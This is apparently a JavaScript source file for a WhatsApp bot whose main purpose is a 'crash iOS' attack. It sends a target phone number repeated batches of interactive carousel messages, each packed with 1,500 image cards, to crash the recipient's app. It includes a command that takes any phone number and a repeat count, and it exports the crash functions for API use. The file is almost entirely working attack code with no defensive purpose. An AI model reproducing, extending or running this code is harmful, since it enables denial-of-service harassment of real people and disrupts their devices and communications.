// main.js
const {
  generateWAMessageFromContent,
  downloadContentFromMessage,
  makeCacheableSignalKeyStore,
  prepareWAMessageMedia,
  fetchLatestBaileysVersion,
  downloadMediaMessage,
  PHONENUMBER_MCC,
  useMultiFileAuthState,
  generateMessageID,
  getTypeMessage,
  makeWASocket,
  delay,
  proto,
  store,
  chats
} = require("@angstvorfrauen/baileys");
const { Boom } = require("@hapi/boom");
const libPhonenumber = require("libphonenumber-js");
const moment = require("moment-timezone");
const NodeCache = require("node-cache");
const gradient = require("gradient-string");
const path = require("path");
const pino = require("pino");
const Jimp = require("jimp");
const os = require("os");
const fs = require("fs");
const { url, fileSha256, mediaKey, fileEncSha256, directPath, jpegThumbnail, scansSidecar, midQualityFileSha256, thumbnailDirectPath, thumbnailSha256, thumbnailEncSha256 } = require("./database/mediaall.js");
const { menu } = require("./database/menu.js");

// === FUNÇÃO: Inicia o crash enviando um ponto (.) ===
async function initiateCrash(sock, targetJid) {
  try {
    await sock.sendMessage(targetJid, { text: "." });
    console.log(`[CRASH] Ponto (.) enviado para ${targetJid}`);
  } catch (err) {
    console.error("[CRASH] Erro ao enviar ponto:", err.message);
  }
}

// === FUNÇÃO: Envia o crash de 1500 cards × 10 lotes ===
async function crashIOS(sock, targetJid) {
  console.log(`[CRASH] Iniciando envio de 10 lotes de 1500 cards para ${targetJid}...`);
  for (let i = 0; i < 10; i++) {
    const singleCard = {
      "header": {
        "title": ".",
        "imageMessage": {
          "url": `${url}`,
          "mimetype": "image/jpeg",
          "caption": ".",
          "fileSha256": `${fileSha256}`,
          "fileLength": "10",
          "height": 1000,
          "width": 1000,
          "mediaKey": `${mediaKey}`,
          "fileEncSha256": `${fileEncSha256}`,
          "directPath": `${directPath}`,
          "jpegThumbnail": `${jpegThumbnail}`,
        },
        "hasMediaAttachment": true
      },
      "body": { "text": "." },
      "footer": { "text": "." },
      "nativeFlowMessage": {
        "buttons": [
          {
            "name": "cta_url",
            "buttonParamsJson": JSON.stringify({
              "display_text": "x",
              "url": "https://google.com",
              "merchant_url": "https://google.com"
            })
          }
        ]
      }
    };

    const card = Array(1500).fill(singleCard);

    try {
      console.log(`[CRASH] Enviando lote ${i + 1}/10...`);
      await sock.sendjson(targetJid, {
        "interactiveMessage": {
          "body": { "text": "." },
          "carouselMessage": {
            "cards": card
          }
        }
      });
      await delay(1000); // Pequeno delay entre lotes
    } catch (err) {
      console.error(`[CRASH] Erro no lote ${i + 1}:`, err.message);
    }
  }
  console.log("[CRASH] Todos os 10 lotes enviados com sucesso!");
}

// === HANDLER DE MENSAGENS ===
module.exports = async (sock, m, chatUpdate) => {
  try {
    const message = m;
    m.id = m.key.id;
    m.isBaileys = m.id.startsWith("BAE5") && m.id.length === 16;
    m.chat = m.key.remoteJid;
    m.fromMe = m.key.fromMe;
    m.isGroup = m.chat.endsWith("@g.us");
    m.sender = sock.decodeJid(m.fromMe && sock.user.id || m.participant || m.key.participant || m.chat || "");
    if (m.isGroup) m.participant = sock.decodeJid(m.key.participant) || "";

    function getTypeM(message) {
      const type = Object.keys(message);
      var restype = (!["senderKeyDistributionMessage", "messageContextInfo"].includes(type[0]) && type[0]) ||
        (type.length >= 3 && type[1] !== "messageContextInfo" && type[1]) ||
        type[type.length - 1] || Object.keys(message)[0];
      return restype;
    }

    m.mtype = getTypeM(m.message);
    m.msg = (m.mtype == "viewOnceMessage" ? m.message[m.mtype].message[getTypeM(m.message[m.mtype].message)] : m.message[m.mtype]);
    m.text = m.msg?.text
        || m.msg?.caption
        || m.message?.conversation
        || m.msg?.contentText
        || m.msg?.selectedDisplayText
        || m.msg?.title
        || "";

    const from = m.chat;
    const body = m.text || "";

    // === PREFIX & COMMAND ===
    const prefix = ["."];
    const isCmd = prefix.some(p => body.startsWith(p));
    const command = isCmd ? body.slice(1).trim().split(" ").shift().toLowerCase() : "";

    // === VARIÁVEIS ÚTEIS ===
    const reply = (text) => sock.sendMessage(from, { text });
    sock.sendjson = (jidss, jsontxt = {}, outrasconfig = {}) => {
      const allmsg = generateWAMessageFromContent(jidss, jsontxt, outrasconfig);
      return sock.relayMessage(jidss, allmsg.message, { messageId: allmsg.key.id });
    };

    // === CRASH iOS: Acionado apenas quando o BOT ENVIA "." ===
    if (m.fromMe && m.text === "." && !m.isBaileys) {
      await crashIOS(sock, from);
      return;
    }

    // === COMANDO MANUAL (opcional): .ios +numero,quantidade ===
    switch (command) {
      case "ios": {
        if (!m.fromMe) return; // Só o bot pode usar
        const [mobileNumber, spamCountStr] = args.join(" ").split(",").map(arg => arg.trim());
        const target = mobileNumber.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        const spam = parseInt(spamCountStr) || 10;

        for (let i = 0; i < spam; i++) {
          const singleCard = {
            "header": {
              "title": ".",
              "imageMessage": {
                "url": `${url}`,
                "mimetype": "image/jpeg",
                "caption": ".",
                "fileSha256": `${fileSha256}`,
                "fileLength": "10",
                "height": 1000,
                "width": 1000,
                "mediaKey": `${mediaKey}`,
                "fileEncSha256": `${fileEncSha256}`,
                "directPath": `${directPath}`,
                "jpegThumbnail": `${jpegThumbnail}`,
              },
              "hasMediaAttachment": true
            },
            "body": { "text": "." },
            "footer": { "text": "." },
            "nativeFlowMessage": {
              "buttons": [{
                "name": "cta_url",
                "buttonParamsJson": JSON.stringify({
                  "display_text": "x",
                  "url": "https://google.com",
                  "merchant_url": "https://google.com"
                })
              }]
            }
          };

          const card = Array(1500).fill(singleCard);
          await sock.sendjson(target, {
            "interactiveMessage": {
              "body": { "text": "." },
              "carouselMessage": { "cards": card }
            }
          });
        }
        reply(`Crash iOS enviado para ${target} (${spam} lotes)`);
      }
      break;
    }
  } catch (err) {
    console.error("Erro no handler:", err);
  }
};

// === EXPORTA FUNÇÕES PARA API ===
module.exports.initiateCrash = initiateCrash;
module.exports.crashIOS = crashIOS;

// === HOT RELOAD ===
let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log(`[HOT-RELOAD] main.js atualizado`);
  delete require.cache[file];
  require(file);
});
